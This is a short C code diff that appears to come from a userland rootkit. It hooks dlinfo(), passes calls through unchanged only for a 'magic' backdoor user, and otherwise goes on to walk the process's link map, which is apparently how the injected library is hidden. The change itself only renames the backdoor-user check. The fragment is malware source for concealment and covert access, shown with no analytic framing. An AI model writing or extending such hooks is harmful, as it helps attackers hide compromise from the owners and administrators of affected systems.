@@ -9,7 +9,7 @@ void repair_linkmap(void){
 
 int dlinfo(void *handle, int request, void *p){
     hook(CDLINFO);
-    if(is_bdusr()) return (long)call(CDLINFO, handle, request, p);
+    if(magicusr()) return (long)call(CDLINFO, handle, request, p);
 
     if(request == 2){
         struct link_map *loop;
